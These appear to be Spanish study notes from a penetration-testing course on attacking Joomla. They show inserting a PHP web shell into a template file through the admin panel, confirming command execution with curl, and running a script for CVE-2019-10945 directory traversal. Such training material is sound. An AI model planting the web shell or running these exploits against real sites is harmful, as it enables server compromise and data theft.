
## 1. Conseguir RCE mediante el panel de administración

Si conseguimos acceso al panel de Joomla con una cuenta que tenga permisos para editar plantillas, podemos ejecutar comandos en el servidor modificando un archivo PHP.

### Acceder al panel

```
http://TARGET/administrator/
```

En el ejemplo del módulo, las credenciales encontradas eran:

```
admin:admin
```

### Si el panel muestra un error

Si aparece el error `Call to a member function format() on null`, el módulo indica que se desactive el plugin **Quick Icon - PHP Version Check** desde:

```
http://TARGET/administrator/index.php?option=com_plugins
```

### Modificar una plantilla

1. Entrar en **Templates**, dentro de Configuration.
    
2. Seleccionar una plantilla, por ejemplo, `protostar`.
    
3. Abrir el archivo `error.php`.
    
4. Añadir el siguiente código PHP:
    

```
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

5. Guardar los cambios.
    

Este código ejecuta como comando del sistema el valor recibido mediante el parámetro HTTP indicado.

### Comprobar la ejecución

```
curl -s "http://TARGET/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

En el ejemplo del módulo, la respuesta fue:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Esto confirma la ejecución de comandos con los permisos del usuario del servidor web, `www-data`.

**Importante:** esta técnica requiere acceso al panel y permisos suficientes para editar la plantilla.

## 2. Vulnerabilidad CVE-2019-10945

Esta vulnerabilidad afecta a versiones de Joomla desde la 1.5.0 hasta la 3.9.4, según el material.

### ¿En qué consiste?

Permite realizar:

- **Directory traversal:** acceder a rutas fuera del directorio previsto.
    
- **Eliminación arbitraria de archivos autenticada:** borrar archivos si se cumplen las condiciones necesarias.
    

Puede servir para enumerar directorios y localizar archivos sensibles, como `configuration.php`, que podría contener credenciales.

La eliminación de archivos puede provocar daños en la aplicación, por lo que no debe utilizarse durante una evaluación sin autorización específica.

### Ejecutar el script del módulo

```
python2.7 joomla_dir_trav.py \
--url "http://TARGET/administrator/" \
--username admin \
--password admin \
--dir /
```

Parámetros:

- `--url`: URL del panel de administración.
    
- `--username`: usuario de Joomla.
    
- `--password`: contraseña.
    
- `--dir`: directorio que se quiere enumerar.
    

En el ejemplo, el script mostró directorios como `administrator`, `components`, `plugins` y `templates`, además de archivos como `configuration.php`, `README.txt` y `index.php`.

**Nota:** esta vulnerabilidad requiere autenticación. El módulo señala que puede ser especialmente útil cuando no es posible acceder directamente al panel para aprovechar la edición de plantillas.

## 3. Metodología para el examen

1. **Buscar credenciales:** revisar la información recopilada durante la enumeración.
    
2. **Acceder al panel:** probar las credenciales encontradas.
    
3. **Comprobar permisos:** verificar si la cuenta puede editar plantillas.
    
4. **Buscar ejecución de comandos:** evaluar la posibilidad de RCE mediante una plantilla PHP.
    
5. **Comprobar vulnerabilidades conocidas:** relacionar la versión identificada con CVE aplicables.
    
6. **Enumerar archivos y directorios:** utilizar técnicas de traversal cuando sean pertinentes.
